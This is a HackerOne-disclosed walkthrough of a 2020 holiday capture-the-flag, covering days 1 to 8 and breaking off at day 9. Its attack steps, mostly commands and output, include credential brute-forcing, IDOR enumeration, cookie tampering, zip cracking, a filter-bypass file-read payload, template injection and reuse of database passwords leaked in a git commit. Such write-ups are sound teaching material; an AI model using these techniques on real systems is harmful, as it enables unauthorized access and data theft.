{"id":1065468,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDY1NDY4","url":"https://hackerone.com/reports/1065468","title":"ctf walkthrough","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2020-12-23T20:18:29.562Z","submitted_at":"2020-12-23T20:18:29.608Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"rekter0","url":"/rekter0","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/Pwypd9b4i37WWTYyGRpT3Ubo/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"","about":"todayisnew reached 100K rep. Let's celebrate with a CTF!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2021-01-12T22:51:10.421Z","bug_reporter_agreed_on_going_public_at":"2021-01-12T22:46:38.793Z","team_member_agreed_on_going_public_at":"2021-01-12T22:51:10.317Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi, \nfinally managed to solve all challenges, this was my first h1ctf, some challenges were pretty nice, some others had some frustrating guessing parts, but overall it was fun.\n\n\nHere goes day1 to day12 walkthroughs:\n\n## Day 1\n\n\nwe have only one asset in scope hackyholidays.h1ctf.com\nthe main page at https://hackerone.com/h1-ctf?type=team looks quite static, with a little files fuzzing or just by guessing first flag is at robots.txt\n\nhttps://hackyholidays.h1ctf.com/robots.txt\n\n```\nUser-agent: *\nDisallow: /s3cr3t-ar3a\nFlag: flag{48104912-28b0-494a-9995-a203d1e261e7}\n```\n\nwe get flag1 and endpoint for day2 challenge\n\n\n\n\n----------------------------------------------------------------\n\n\n## Day 2 \n\n\nfetching day2 challenge page, https://hackyholidays.h1ctf.com/s3cr3t-ar3a, another static looking under construction page, except we have some js files this time\n```\n\u003cscript src=\"/assets/js/jquery.min.js\"\u003e\u003c/script\u003e\n\u003cscript src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\" integrity=\"sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa\" crossorigin=\"anonymous\"\u003e\u003c/script\u003e\n```\n\nbootstrap js file is from a cdn, probably nothing special there while jquery is self hosted\nby checking it, first line is a comment that shows jquery version `/*! jQuery v3.5.1 | (c) JS Foundation and other contributors | jquery.org/license */`\n\nwent to diff challenge jquery file with original jquery 3.5.1 file from here `https://code.jquery.com/jquery-3.5.1.min.js`\n\nfirst i used js beautifier on both files, you can install it with `pip install jsbeautifier`\n```\n$ js-beautify jquery.min.js \u003e 1      \n$ js-beautify jquery-3.5.1.min.js \u003e 2\n$ diff 1 2\n37,48c37\n\u003c         },\n\u003c         h1_0 = 'la',\n\u003c         h1_1 = '}',\n\u003c         h1_2 = '',\n\u003c         h1_3 = 'f',\n\u003c         h1_4 = 'g',\n\u003c         h1_5 = '{b7ebcb75',\n\u003c         h1_6 = '8454-',\n\u003c         h1_7 = 'cfb9574459f7',\n\u003c         h1_8 = '-9100-4f91-';\n\u003c     document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);\n\u003c     document.getElementById('alertbox').setAttribute('next-page', '/ap' + 'ps');\n---\n\u003e         };\n```\n\nthere looks like we have some flag parts splited on some js variables, concatinating them in the right order will give us the flag\n```\n$ node\n\u003e h1_0 = 'la',\n... h1_1 = '}',\n... h1_2 = '',\n... h1_3 = 'f',\n... h1_4 = 'g',\n... h1_5 = '{b7ebcb75',\n... h1_6 = '8454-',\n... h1_7 = 'cfb9574459f7',\n... h1_8 = '-9100-4f91-';\n'-9100-4f91-'\n\u003e \n\u003e console.log(h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);\nflag{b7ebcb75-9100-4f91-8454-cfb9574459f7}\n```\n\nand obviously day3 challenge will be located at `/apps`\n\n\n\n----------------------------------------------------------------\n\n\n## Day 3\n\n\nfetching page, https://hackyholidays.h1ctf.com/apps, it looks like this page will host links for next days challenges\ntoday challenge is at https://hackyholidays.h1ctf.com/people-rater\n\nby looking at today's app, we have 2 options, to load more entries or check the rating for an entry\nlet's load some more entries\n\n```\n$ curl https://hackyholidays.h1ctf.com/people-rater/page/2\n{\"results\":[{\"id\":\"eyJpZCI6N30=\",\"name\":\"Beatriz Rasmussen\"},{\"id\":\"eyJpZCI6OH0=\",\"name\":\"Carly Legge\"},{\"id\":\"eyJpZCI6OX0=\",\"name\":\"Violet Hussain\"},{\"id\":\"eyJpZCI6MTB9\",\"name\":\"Leonidas Delarosa\"},{\"id\":\"eyJpZCI6MTF9\",\"name\":\"Sanya Lancaster\"}]}\n```\n\nthere's an integer as page number in the GET request, i went to increment it untill there's no more new entries, still no flag\neach entry has a `name` and a an `id`\nthe ids seems base64 encoded, decoding one of them shows up as a json data `{\"id\":[int]}`\n\nnow, to check the rating for an entry, a GET http request is made as the following:\n```\n$ curl https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=\n{\"id\":\"eyJpZCI6Mn0=\",\"name\":\"Tea Avery\",\"rating\":\"Awful\"}\n```\n\nagain, we have that base64 encoded id, since the id seemed as an incrementing int, i went fuzzing for some ids from 0 to 100 with bash and curl to see if something comes up\n```\n$ for i in {0..100}\ndo\ncurl https://hackyholidays.h1ctf.com/people-rater/entry?id=`printf \"{\\\"id\\\":${i}}\"|base64`\ndone\n[\"Entry not found\"]{\"id\":\"eyJpZCI6MX0=\",\"name\":\"The Grinch\",\"rating\":\"Amazing in every possible way!\",\"flag\":\"flag{b705fb11-fb55-442f-847f-0931be82ed9a}\"}{\"id\":\"eyJpZCI6Mn0=\",\"name\":\"Tea Avery\",\"rating\":\"Awful\"}{\"id\":\"eyJpZCI6M30=\",\"name\":\"Mihai Matthews\",\"rating\":\"Loathsome\"}{\"id\":\"eyJpZCI6NH0=\",\"name\":\"Ruth Ward\",\"rating\":\"Disgusting\"}\n....\n....\n....\n```\nand flag was there at id=1\n\n\n----------------------------------------------------------------\n\n## Day 4\n\n\ntoday's app is swag-shop https://hackyholidays.h1ctf.com/swag-shop\n\nat the bottom of the page source there's some javascript code\n```JAVASCRIPT\n$.getJSON(\"/swag-shop/api/stock\", function(o) {\n    $.each(o.products, function(o, t) {\n        $(\".product-holder\").append('\u003cdiv class=\"col-md-4 product-box\"\u003e\u003cdiv\u003e\u003cimg class=\"img-responsive\" src=\"/assets/images/product_image_coming_soon.jpg\"\u003e\u003c/div\u003e\u003cdiv class=\"text-center product-name\"\u003e' + t.name + '\u003c/div\u003e\u003cdiv class=\"text-center product-cost\"\u003e\u0026dollar;' + t.cost + '\u003c/div\u003e\u003cdiv class=\"text-center\"\u003e\u003cinput type=\"button\" data-product-id=\"' + t.id + '\" class=\"btn btn-success purchase\" value=\"Purchase\"\u003e\u003c/div\u003e\u003c/div\u003e')\n    }), $(\"input.purchase\").click(function() {\n        $.post(\"/swag-shop/api/purchase\", {\n            id: $(this).attr(\"data-product-id\")\n        }, function(o) {\n            window.location = \"/swag-shop/checkout/\" + o.checkoutURL\n        }).fail(function() {\n            $(\"#login_modal\").modal(\"show\")\n        })\n    })\n}), $(\".loginbtn\").click(function() {\n    $.post(\"/swag-shop/api/login\", {\n        username: $('input[name=\"username\"]').val(),\n        password: $('input[name=\"password\"]').val()\n    }, function(o) {\n        document.cookie(\"token=\" + o.token), window.location = \"/swag-shop\"\n    }).fail(function() {\n        alert(\"Login Failed\")\n    })\n});\n```\nlooks like the swag shop is interacting with an API located at `/swag-shop/api/[endpoint]`\ni went to fuzz hoping to find some more api endpoints\ni used ffuf, you can obtain it here `https://github.com/ffuf/ffuf` and wordlists from SecLists, here `https://github.com/danielmiessler/SecLists`\n\n```\n$ ffuf -w ./SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u \"https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ\" -mc all -fc 404 -fs 155\n[...]\n\n :: Method           : GET\n :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ\n :: Wordlist         : FUZZ: ./SecLists/Discovery/Web-Content/directory-list-2.3-small.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: all\n :: Filter           : Response status: 404\n :: Filter           : Response size: 155\n________________________________________________\n\nuser                    [Status: 400, Size: 35, Words: 3, Lines: 1]\nstock                   [Status: 200, Size: 167, Words: 8, Lines: 1]\nsessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]\n\n```\nwe have 2 more endpoints that doesnt exist in the js code from earlier\ni went fetching them both to see what we got new\n\n```\ncurl https://hackyholidays.h1ctf.com/swag-shop/api/sessions | jq\n{\n  \"sessions\": [\n    \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=\",\n    \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=\",\n    \"eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==\",\n    \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=\",\n    \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=\",\n    \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=\",\n    \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=\",\n    \"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0=\"\n  ]\n}\n\n```\n\nsessions look like base64 encoded json data, by decoding the data all of them look very similar except for this one, that has some data in user field.\n\n```\n$ for i in $(curl https://hackyholidays.h1ctf.com/swag-shop/api/sessions | jq -r \".sessions|.[]\"); do printf $i|base64 -d;echo; done\n{\"user\":null,\"cookie\":\"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0YmZjMmNmZGYzMzg1MWJkZDcyMzY0ZTFlYjdmNDY3NDkzNzIwMGNiZjNhMjQ3Y2RmY2E2N2FmMzdjM2I0ZWNlZTVkM2VkNzU3MTUwYjdkYzkyNWI4Y2I3ZWZiNjk2N2NjOTk0MjU=\"}\n{\"user\":null,\"cookie\":\"ZjM2MzNjM2JkZGUyMzVmMmY2ZjcxNjdlNDNmZjQwZTlmY2RhNjYxNWM5Y2Y1ZjY2ODU3NjkxMTQ2Nzk0ZmIxOWZhN2ZhZjg0Y2E5Nzk1NTQ2MzMzZTc0MWJlMzVhZDA0MDUwYmQ3NDlmZTE4MmNkMjMxMzU0MWRlMTJhNWYzOGQ=\"}\n{\"user\":\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\"cookie\":\"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY=\"}\n{\"user\":null,\"cookie\":\"MDRmYTBhN2FiNjY5MGFlOWFmYTE4ZjE2N2JjZmYzZWJkOTRlOGYwMjI1OGIyNjM1ODU0Njc2YTdlZTM4MzFiM2I1MTUzMzViMjFhYzVkMTc4ODE3OGM4Y2JlOTk4MjJlMDI2YjQzZDQxMGNmNTg1ODQxZjBmODBmZWQxZmE1YmE=\"}\n{\"user\":null,\"cookie\":\"M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y=\"}\n{\"user\":null,\"cookie\":\"MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU=\"}\n{\"user\":null,\"cookie\":\"MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ=\"}\n{\"user\":null,\"cookie\":\"OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM=\"}\n\n```\n\nnow back to /user endpoint\n\n```\n$ curl https://hackyholidays.h1ctf.com/swag-shop/api/user\n{\"error\":\"Missing required fields\"}\n```\n\nso we are missing a parameter here from the error message, lets do some more fuzzing for GET parameters to `/user` API endpoint, again using ffuf and parameters wordlist obtained from https://wordlists.assetnote.io/ \n\n```\n$ ffuf -w ./httparchive_parameters_top_1m_2020_11_21.txt -u \"https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=test\" -mc all -fs 35\n[...]\n\n :: Method           : GET\n :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=test\n :: Wordlist         : FUZZ: ./httparchive_parameters_top_1m_2020_11_21.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: all\n :: Filter           : Response size: 35\n________________________________________________\n\nuuid                    [Status: 404, Size: 40, Words: 5, Lines: 1]\n````\nthere's a param discovered called uuid, it makes sense now that the user field obtained from sessions looks like a uuid\nlets fetch it\n\n```\n$ curl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043\n{\"uuid\":\"C7DCCE-0E0DAB-B20226-FC92EA-1B9043\",\"username\":\"grinch\",\"address\":{\"line_1\":\"The Grinch\",\"line_2\":\"The Cave\",\"line_3\":\"Mount Crumpit\",\"line_4\":\"Whoville\"},\"flag\":\"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}\"}\n\n```\nand bingo, a flag!\n\n\n----------------------------------------------------------------\n\n\n## Day 5\n\n\ntoday's challenge is securelogin https://hackyholidays.h1ctf.com/secure-login, it doesn't seem much more than the login form, by entering any user/pass combination we have the error message `Invalid Username`, so apparently we can enumerate valid users as a first step! so brutefocing this time with ffuf and SecLists to the rescue.\n\n```\nffuf -w ./10-million-password-list-top-1000.txt -u https://hackyholidays.h1ctf.com/secure-login -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=FUZZ\u0026password=test' -mc all -fr 'Invalid Username'\n[...]\n\n :: Method           : POST\n :: URL              : https://hackyholidays.h1ctf.com/secure-login\n :: Wordlist         : FUZZ: ./10-million-password-list-top-1000.txt\n :: Header           : Content-Type: application/x-www-form-urlencoded\n :: Data             : username=FUZZ\u0026password=test\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: all\n :: Filter           : Regexp: Invalid Username\n________________________________________________\n\naccess                  [Status: 200, Size: 1724, Words: 464, Lines: 37]\n```\n\nwe got a valid user name `access`, by testing it in the form with a random pass, new error msg pops up `Invalid Password`\nnow to bruteforce the password using same attack\n\n```\nffuf -w ./10-million-password-list-top-1000.txt -u https://hackyholidays.h1ctf.com/secure-login -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=access\u0026password=FUZZ' -mc all -fr 'Invalid Password'\n[...]\n\n :: Method           : POST\n :: URL              : https://hackyholidays.h1ctf.com/secure-login\n :: Wordlist         : FUZZ: ./10-million-password-list-top-1000.txt\n :: Header           : Content-Type: application/x-www-form-urlencoded\n :: Data             : username=access\u0026password=FUZZ\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: all\n :: Filter           : Regexp: Invalid Password\n________________________________________________\n\ncomputer                [Status: 302, Size: 0, Words: 1, Lines: 1]\n```\nwe now got access using creds `access:computer`, but nothing much inside, \nthe cookie that was set after logging in is `securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D`, again another json base64 data, decoding it we get `{\"cookie\":\"1b5e5f2c9d58a30af4e16a71a45d0172\",\"admin\":false}`, the `admin` field looks promising, by changing false to true and re-encoding the json `eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==`, we now have access to download a zip file located at https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip\n\nthe zip is password protected, i used fcrackzip here `https://github.com/hyc/fcrackzip` and rockyou wordlist here `https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt`\n\n```\n$ fcrackzip -v -D -u -p /home/rekt/tools/wordlist/rockyou.txt /home/rekt/Downloads/my_secure_files_not_for_you.zip\nfound file 'xxx.png', (size cp/uc 215105/215058, flags 9, chk 852f)\nfound file 'flag.txt', (size cp/uc     55/    43, flags 9, chk 82ca)\n\n\nPASSWORD FOUND!!!!: pw == hahahaha\n\n$ unzip my_secure_files_not_for_you.zip \nArchive:  my_secure_files_not_for_you.zip\n[my_secure_files_not_for_you.zip] xxx.png password: \n  inflating: xxx.png                 \n extracting: flag.txt                \n\n$ cat flag.txt \nflag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}\n```\n\nflag and a grinch picture :)\n\n\n----------------------------------------------------------------\n\n\n## Day 6\n\n\nmy-diary is day6's challenge here https://hackyholidays.h1ctf.com/my-diary/ \nby browsing main page we're redirected to `/my-diary/?template=entries.html`\n\ni tried /my-diary/entries.html and it show's the same content, so i assumed that the file is provided to template GET parameter is being read and shown\nalso i tried checking which backend it is, after few tries, home page is index.php\nso i tried reading it and i got the source code\n\n\n```PHP\n$ curl \"https://hackyholidays.h1ctf.com/my-diary/?template=index.php\"\n\n\u003c?php\nif( isset($_GET[\"template\"])  ){\n    $page = $_GET[\"template\"];\n    //remove non allowed characters\n    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);\n    //protect admin.php from being read\n    $page = str_replace(\"admin.php\",\"\",$page);\n    //I've changed the admin file to secretadmin.php for more security!\n    $page = str_replace(\"secretadmin.php\",\"\",$page);\n    //check file exists\n    if( file_exists($page) ){\n       echo file_get_contents($page);\n    }else{\n        //redirect to home\n        header(\"Location: /my-diary/?template=entries.html\");\n        exit();\n    }\n}else{\n    //redirect to home\n    header(\"Location: /my-diary/?template=entries.html\");\n    exit();\n}\n```\n\nlooks like we have a local file disclosure bug if the file name matches the regex `[a-zA-Z0-9.]`, any other chars will be truncated\n\nnow, browsing to /secretadmin.php says that we are not allowed to view it from my ip, `You cannot view this page from your IP Address`\n\nthe file read bug to the rescue then,\nwe have str_replace used twice to truncate strings `admin.php` and `secretadmin.php`\nluckily str_replace is not recursive\n\n```\n$ php -a\nInteractive mode enabled\n\nphp \u003e echo str_replace(\"admin.php\",\"\",\"admadmin.phpin.php\");\nadmin.php\nphp \u003e \n\n```\n\nlet's build secretadmin.php in a way that survives str_replace \n\n```\n$ php -a\nInteractive mode enabled\n\nphp \u003e $page = preg_replace('/([^a-zA-Z0-9.])/','','secretsecretadmiadmin.phpn.phpadmin.phadmin.phpp');\nphp \u003e $page = str_replace(\"admin.php\",\"\",$page);\nphp \u003e $page = str_replace(\"secretadmin.php\",\"\",$page);\nphp \u003e echo $page;\nsecretadmin.php\nphp \u003e \n```\n`secretsecretadmiadmin.phpn.phpadmin.phadmin.phpp` will do the job :)\n\nnow by browsing to https://hackyholidays.h1ctf.com/my-diary/?template=secretsecretadmiadmin.phpn.phpadmin.phadmin.phpp, we obtain the flag \n\t\nflag{18b130a7-3a79-4c70-b73b-7f23fa95d395}\n\n\n----------------------------------------------------------------\n\n\n## Day 7\n\n\nDay7's app is hate-mail-generator located at https://hackyholidays.h1ctf.com/hate-mail-generator/\nwe could either create new campains or consult the already existing ones\n\nwe already have one campaign, https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030 \nfrom there we can learn about the templating syntax \n`{{template:cbdj3_grinch_header.html}}` seems to read and show the given file \n`{{name}}` prints variable called name\n\n\nnow back to make a new campain, we can't create any, but we can preview them \nhttps://hackyholidays.h1ctf.com/hate-mail-generator/new\nby entering a non existing template file `{{template:blabla.html}}` file we get a message `Cannot find template file /templates/blabla.html`\nso templates files are located at `/templates` directory, luckily directory listing is enabled https://hackyholidays.h1ctf.com/hate-mail-generator/templates\nthere's 3 files, we already know about those 2 files from the existing campaign `cbdj3_grinch_header.html` and `cbdj3_grinch_footer.html`\nbrowsing any of the files directly returns 403\n\nwe want to read the 3rd template file `38dhs_admins_only_header.html `, lets try it with preview campaign function in the app\n\n```HTTP\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\nContent-Length: 151\nContent-Type: application/x-www-form-urlencoded\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n\npreview_markup=%7B%7Btemplate%3A38dhs_admins_only_header.html+%7D%7D\u0026preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D\n\n\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Mon, 21 Dec 2020 20:16:53 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nContent-Length: 64\n\nYou do not have access to the file 38dhs_admins_only_header.html\n```\n\nprevew_markup contains our campaign markup and preview_data contains a json with name (from the form) and email\n\nso there seems to be some kind of blacklist on that template file on preview_markup parameter\n\nbut we still can put anything in preveiew_data, it's not blacklisted there and we call it from preview_markup\nby adding {{template:38dhs_admins_only_header.html}} at name for example and we call name as a variable we get the flag\n\n```HTTP\nPOST /hate-mail-generator/new/preview HTTP/1.1\nHost: hackyholidays.h1ctf.com\nContent-Length: 123\nContent-Type: application/x-www-form-urlencoded\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n\npreview_markup=%7B%7Bname%7D%7D\u0026preview_data={\"name\":\"{{template:38dhs_admins_only_header.html}}\",\"email\":\"alice@test.com\"}\n\n\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Mon, 21 Dec 2020 20:20:27 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nContent-Length: 339\n\n\u003chtml\u003e\n\u003cbody\u003e\n\u003ccenter\u003e\n    \u003ctable width=\"700\"\u003e\n        \u003ctr\u003e\n            \u003ctd height=\"80\" width=\"700\" style=\"background-color: #64d23b;color:#FFF\" align=\"center\"\u003eGrinch Network Admins Only\u003c/td\u003e\n        \u003c/tr\u003e\n        \u003ctr\u003e\n            \u003ctd style=\"padding:20px 10px 20px 10px\"\u003e\n                \u003ch4\u003eflag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}\u003c/h4\u003e\n```\n\nthat's it for day7\n\n----------------------------------------------------------------\n\n## Day 8\n\n\nthis day's challenge is a forum located at https://hackyholidays.h1ctf.com/forum\nafter lot of fuzzing and searching, couldn't come up with anything except `/forum/phpmyadmin` endpoint which looks like phpmyadmin interface, but we need db creds to access it,\nafter quite some time went to adam's github `https://github.com/adamtlangley`, we can see in his activity he created this repo `https://github.com/Grinch-Networks/forum` on december 7th, now we got forum source code !\ni spent quite sometime on the source code, and i wasn't able to find anything, that's when i went back to see commits history in github https://github.com/Grinch-Networks/forum/commits/main\n\ncommit `07799dce61d7c3add39d435bdac534097de404dc` has initial code release with db creds for file `models/Db.php`\nhttps://github.com/Grinch-Networks/forum/commit/07799dce61d7c3add39d435bdac534097de404dc#diff-998930400b08c30f6949f365207fd1d0c693d22ae5de6b9de752ef5c57ce9754\n```\n self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );\n```\n\nwe use it to login to phpmyadmin\nthen we have users table with users password hashes https://hackyholidays.h1ctf.com/forum/phpmyadmin?db=forum\u0026table=user\n```\n35D652126CA1706B59DB02C93E0C9FBF\n388E015BC43980947FCE0E5DB16481D1\n```\nchecked both users hashes on `crackstation.net`\ngrinch user password hash reversed to BahHumbug, let's login to forum now!\n\nwe use it to login then and we go to the admin section we find a post with flag inside flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}\n\n\n----------------------------------------------------------------\n\n## Day 9\n\n\nthis day's challenge located at https://hackyholidays.h1ctf.com/evil-quiz\nthe app workflow is very simple, \n1- input your name\n2- fill the quiz\n3- obtain result + how many other users use the same name 